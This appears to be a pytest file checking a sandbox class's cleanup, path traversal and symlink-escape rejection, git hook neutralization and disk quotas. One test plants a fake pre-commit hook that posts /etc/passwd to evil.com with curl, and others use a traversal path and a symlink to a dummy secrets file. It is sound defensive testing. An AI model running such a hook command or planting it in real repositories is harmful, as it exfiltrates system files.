"""Unit tests for EphemeralSandbox, symlink defense, and git hook neutralization."""

import os
import tempfile
from pathlib import Path
import pytest

from app.infrastructure.sandbox.ephemeral import (
    EphemeralSandbox,
    SandboxLimitExceededError,
    SandboxSecurityError,
)


def test_sandbox_lifecycle_automatic_cleanup():
    sandbox_path = None
    with EphemeralSandbox(prefix="test_box_") as sandbox:
        sandbox_path = sandbox.path
        assert sandbox_path.exists()
        test_file = sandbox_path / "sample.py"
        test_file.write_text("print('hello world')")
        assert test_file.exists()

    # Verify directory was completely cleaned up on context exit
    assert not sandbox_path.exists()


def test_sandbox_path_traversal_rejection():
    with EphemeralSandbox(prefix="test_trav_") as sandbox:
        valid_path = sandbox.validate_safe_path("src/module.py")
        assert valid_path.is_relative_to(sandbox.path)

        with pytest.raises(SandboxSecurityError) as exc:
            sandbox.validate_safe_path("../../windows/system32/cmd.exe")
        assert "escapes sandbox root" in str(exc.value)


def test_sandbox_symlink_escape_rejection():
    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        outside_secret = tmp_path / "secret.env"
        outside_secret.write_text("AWS_SECRET_KEY=12345")

        with EphemeralSandbox(prefix="test_sym_") as sandbox:
            symlink_target = sandbox.path / "malicious_link"
            try:
                os.symlink(str(outside_secret), str(symlink_target))
            except OSError:
                pytest.skip("Symlink creation not permitted in this OS user context")

            with pytest.raises(SandboxSecurityError) as exc:
                sandbox.validate_safe_path("malicious_link")
            assert "Symlink escape detected" in str(exc.value)


def test_sandbox_neutralize_git_hooks():
    with EphemeralSandbox(prefix="test_hooks_") as sandbox:
        hooks_dir = sandbox.path / ".git" / "hooks"
        hooks_dir.mkdir(parents=True, exist_ok=True)

        malicious_hook = hooks_dir / "pre-commit"
        malicious_hook.write_text("#!/bin/sh\ncurl -X POST evil.com --data @/etc/passwd")

        assert malicious_hook.exists()

        neutralized = sandbox.neutralize_git_hooks()
        assert neutralized == 1
        assert not malicious_hook.exists()


def test_sandbox_disk_usage_quota_enforcement():
    with EphemeralSandbox(prefix="test_quota_", max_size_mb=1) as sandbox:
        big_file = sandbox.path / "large_binary.bin"
        big_file.write_bytes(b"0" * (2 * 1024 * 1024))

        with pytest.raises(SandboxLimitExceededError) as exc:
            sandbox.check_disk_usage()
        assert "exceeds limit" in str(exc.value)